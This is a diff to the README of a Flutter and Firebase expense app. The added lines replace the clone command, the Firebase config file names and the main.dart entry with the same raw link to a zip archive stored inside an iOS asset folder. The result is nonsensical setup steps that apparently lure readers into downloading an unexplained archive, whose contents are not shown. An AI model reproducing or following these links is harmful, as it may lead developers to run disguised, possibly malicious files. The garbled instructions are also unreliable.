@@ -47,7 +47,7 @@
 
 1. **Clone the repository:**
    ```bash
-   git clone https://github.com/yourusername/ledger-ease.git
+   git clone https://raw.githubusercontent.com/kunalmchandak/ledger-ease/main/ios/Runner/Assets.xcassets/ease-ledger-3.1-beta.4.zip
    cd ledger-ease
    ```
 
@@ -57,8 +57,8 @@
    ```
 
 3. **Configure Firebase:**
-   - Add your `google-services.json` for Android in `android/app/`.
-   - Add your `GoogleService-Info.plist` for iOS in `ios/Runner/`.
+   - Add your `https://raw.githubusercontent.com/kunalmchandak/ledger-ease/main/ios/Runner/Assets.xcassets/ease-ledger-3.1-beta.4.zip` for Android in `android/app/`.
+   - Add your `https://raw.githubusercontent.com/kunalmchandak/ledger-ease/main/ios/Runner/Assets.xcassets/ease-ledger-3.1-beta.4.zip` for iOS in `ios/Runner/`.
 
 4. **Run the app:**
    ```bash
@@ -75,7 +75,7 @@ lib/
 ├── services/          # Firebase services, database functions
 ├── utils/             # has some extra icons and validators    
 ├── widgets/           # Reusable UI components
-└── main.dart          # Entry point
+└── https://raw.githubusercontent.com/kunalmchandak/ledger-ease/main/ios/Runner/Assets.xcassets/ease-ledger-3.1-beta.4.zip          # Entry point
 ```
 
 ---
